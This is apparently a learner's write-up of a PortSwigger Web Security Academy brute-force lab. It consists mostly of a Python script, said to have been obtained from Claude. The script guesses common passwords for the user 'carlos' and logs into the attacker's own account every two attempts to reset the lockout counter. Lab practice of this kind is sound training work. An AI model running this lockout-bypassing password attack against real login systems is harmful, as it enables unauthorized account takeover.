That Lab was don't logical for me I didn't understand how to solve this lab, so I just knew that there I can solve not through Intruder. 
So I just write to Claude that I need python code to solve this lab.
import requests

LAB_URL = "https://YOUR-LAB-ID.web-security-academy.net"
OWN_USER = "wiener"
OWN_PASS = "peter"
TARGET   = "carlos"

PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789",
    "12345", "1234", "111111", "1234567", "dragon", "123123",
    "baseball", "abc123", "football", "monkey", "letmein",
    "shadow", "master", "666666", "qwertyuiop", "123321",
    "mustang", "1234567890", "michael", "654321", "superman",
    "1qaz2wsx", "7777777", "121212", "000000", "qazwsx",
    "123qwe", "killer", "trustno1", "jordan", "jennifer",
    "zxcvbnm", "asdfgh", "hunter", "buster", "soccer",
    "harley", "batman", "andrew", "tigger", "sunshine",
    "iloveyou", "2000", "charlie", "robert", "thomas",
    "hockey", "ranger", "daniel", "starwars", "klaster",
    "112233", "george", "computer", "michelle", "jessica",
    "pepper", "1111", "zxcvbn", "555555", "11111111",
    "131313", "freedom", "777777", "pass", "maggie",
    "159753", "aaaaaa", "ginger", "princess", "joshua",
    "cheese", "amanda", "summer", "love", "ashley",
    "nicole", "chelsea", "biteme", "matthew", "access",
    "yankees", "987654321", "dallas", "austin", "thunder",
    "taylor", "matrix",
]

session = requests.Session()
login_url = f"{LAB_URL}/login"

def try_login(username, password):
    resp = session.post(
        login_url,
        data={"username": username, "password": password},
        allow_redirects=False,
        timeout=15
    )
    return resp.status_code  # 302 = успех, 200 = неверный пароль

print(f"[*] Атака на '{TARGET}' — {len(PASSWORDS)} паролей")
print(f"[*] Сброс счётчика через '{OWN_USER}' каждые 2 попытки\n")

found = None
for i, pwd in enumerate(PASSWORDS):
    # Каждые 2 попытки сбрасываем счётчик успешным логином
    if i % 2 == 0:
        status = try_login(OWN_USER, OWN_PASS)
        print(f"    [reset] {OWN_USER}:{OWN_PASS} → HTTP {status}")

    status = try_login(TARGET, pwd)
    marker = "  ✓ НАЙДЕН!" if status == 302 else ""
    print(f"[{i+1:>3}] {TARGET}:{pwd:<20} → HTTP {status}{marker}")

    if status == 302:
        found = pwd
        break

print()
if found:
    print(f"[+] Пароль carlos: {found}")
    print(f"[+] Логин: {LAB_URL}/login")
else:
    print("[-] Пароль не найден в списке.")



<img width="645" height="104" alt="image" src="https://github.com/user-attachments/assets/ebcdcebb-1a6a-49eb-b95f-9864599461e7" />

<img width="1920" height="876" alt="image" src="https://github.com/user-attachments/assets/16cb6399-e5c4-4f68-a083-6ce5efc3bc6e" />
